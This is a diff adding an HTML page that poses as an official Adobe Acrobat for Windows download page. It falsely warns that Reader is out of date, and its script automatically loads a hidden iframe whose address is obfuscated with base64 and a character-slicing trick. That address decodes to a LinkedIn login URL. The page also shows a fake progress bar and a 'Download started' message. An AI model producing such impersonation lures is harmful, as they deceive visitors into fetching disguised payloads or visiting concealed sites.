@@ -1,0 +1,173 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Adobe Acrobat for Windows — Download</title>
+  <style>
+    :root{
+      --bg:#ffffff;
+      --card:#fff;
+      --accent:#0078d4;
+      --muted:#666;
+    }
+    html,body{height:100%;margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;color:#111;background:linear-gradient(180deg,#f6f8fb,#ffffff);}
+    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
+    .card{
+      width:900px;max-width:96%;border-radius:12px;padding:28px;box-shadow:0 10px 30px rgba(20,30,60,0.08);background:#fff;display:grid;grid-template-columns:120px 1fr;gap:18px;
+    }
+
+    .icon{
+      width:100px;height:100px;border-radius:12px;background:#f2f6fb;display:flex;align-items:center;justify-content:center;overflow:hidden;
+    }
+    .icon img{
+      max-width:90%;
+      max-height:90%;
+    }
+
+    h1{margin:0;font-size:20px}
+    p.lead{margin:8px 0 0;color:var(--muted)}
+    .features{display:flex;gap:12px;flex-wrap:wrap;margin-top:14px}
+    .feat{flex:1;min-width:160px;background:#fafbfd;padding:12px;border-radius:10px;font-size:14px}
+
+    .notice-top{
+      grid-column: 1 / -1;
+      margin-bottom:16px;
+      padding:16px;
+      border-radius:10px;
+      background:#fff3cd;
+      border:1px solid #ffecb5;
+      color:#664d03;
+      font-size:16px;
+      font-weight:600;
+      display:flex;
+      gap:12px;
+      align-items:center;
+    }
+    .notice-top .spinner{
+      border: 4px solid rgba(0,0,0,0.05);
+      border-top: 4px solid var(--accent);
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      animation: spin 1s linear infinite;
+      flex-shrink:0;
+    }
+    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+
+    .download-area{margin-top:18px;display:flex;align-items:center;gap:16px}
+    .btn{display:inline-block;padding:10px 14px;border-radius:8px;text-decoration:none;font-weight:600;cursor:pointer}
+    .btn-ghost{background:transparent;border:1px solid #e3e6ea;color:#111}
+
+    .progress-wrap{flex:1;min-width:200px}
+    .progress-bar{height:12px;background:#eef3fb;border-radius:999px;overflow:hidden}
+    .progress-inner{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),#46a0ff);border-radius:999px;transition:width 300ms linear}
+
+    .status{font-size:13px;color:var(--muted);margin-top:8px}
+
+    footer{margin-top:18px;color:#999;font-size:13px}
+    @media (max-width:700px){
+      .card{grid-template-columns:1fr; text-align:center}
+      .download-area{flex-direction:column;align-items:stretch}
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card" role="main" aria-live="polite">
+
+      <div class="notice-top" role="alert">
+        <div class="spinner" aria-hidden="true"></div>
+        <div>
+          <div>Adobe Reader not detected or out of date</div>
+          <div style="font-size:14px;font-weight:400;margin-top:4px;">
+            We will download the installer so you can update to the latest Reader.
+          </div>
+        </div>
+      </div>
+
+      <div class="icon" aria-hidden="true">
+        <!-- <img src="bravo" alt="Adobe Logo" /> -->
+         <img alt="Adobe Logo" src="data:image/png;base64,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" />
+      </div>
+
+      <div>
+        <h1>Adobe Acrobat for Windows</h1>
+        <p class="lead">Work with PDFs smarter on Windows 10 and 11 — read, edit, sign, and protect PDFs.</p>
+
+        <div class="features" role="list">
+          <div class="feat"><strong>Reliable PDF Viewing</strong><div style="margin-top:6px;color:var(--muted)">Open and view PDFs with high fidelity on Windows.</div></div>
+          <div class="feat"><strong>Powerful Editing Tools</strong><div style="margin-top:6px;color:var(--muted)">Edit text and images directly in PDFs.</div></div>
+          <div class="feat"><strong>E-signature Support</strong><div style="margin-top:6px;color:var(--muted)">Sign PDFs electronically from your desktop.</div></div>
+          <div class="feat"><strong>PDF Security</strong><div style="margin-top:6px;color:var(--muted)">Password-protect and redact sensitive content.</div></div>
+        </div>
+
+        <div class="download-area" aria-hidden="false">
+          <div class="progress-wrap">
+            <div class="progress-bar" aria-hidden="true">
+              <div class="progress-inner" id="progressInner"></div>
+            </div>
+            <div class="status" id="statusText">Preparing download…</div>
+          </div>
+
+          <div style="display:flex;flex-direction:column;gap:8px;align-items:flex-end">
+            <a id="manualBtn" class="btn btn-ghost" href="atob('k9saHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2xvZ2luP2Zyb21TaWduSW49dHJ1ZSZ0cms9Z3Vlc3RfaG9tZXBhZ2UtYmFzaWNfbmF2LWhlYWRlci1zaWduaW4='.slice(3))" download>Manually start download</a>
+            <a id="cancelBtn" class="btn" style="background:#f3f4f6;border-radius:8px;color:#222" href="#" onclick="return false;">Cancel</a>
+          </div>
+        </div>
+
+        <footer>Adobe - Copyright © 2025 All rights reserved.</footer>
+      </div>
+    </div>
+  </div>
+
+<script>
+(function(){
+  const progress = document.getElementById('progressInner');
+  const status = document.getElementById('statusText');
+
+  function startAutoDownload(){
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = atob('k9saHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2xvZ2luP2Zyb21TaWduSW49dHJ1ZSZ0cms9Z3Vlc3RfaG9tZXBhZ2UtYmFzaWNfbmF2LWhlYWRlci1zaWduaW4='.slice(3));
+    document.body.appendChild(iframe);
+    simulateProgress();
+  }
+
+  let pct = 0;
+  function simulateProgress(){
+    stepTo(70, 600);
+    setTimeout(()=> stepTo(92, 1500), 900);
+    setTimeout(()=> {
+      stepTo(100, 600);
+      status.textContent = 'Download started. Check your browser downloads.';
+    }, 2600);
+  }
+
+  function stepTo(target, duration){
+    const start = pct;
+    const delta = target - start;
+    const startTime = performance.now();
+    function frame(now){
+      const t = Math.min(1, (now - startTime)/duration);
+      const eased = t<.5 ? 2*t*t : -1 + (4 - 2*t)*t;
+      pct = Math.round(start + delta*eased);
+      progress.style.width = pct + '%';
+      if (t < 1) requestAnimationFrame(frame);
+    }
+    requestAnimationFrame(frame);
+  }
+
+  setTimeout(startAutoDownload, 800);
+
+  document.getElementById('cancelBtn').addEventListener('click', function(e){
+    e.preventDefault();
+    status.textContent = 'Download cancelled.';
+    pct = 0;
+    progress.style.width = '0%';
+  });
+})();
+</script>
+</body>
+</html>
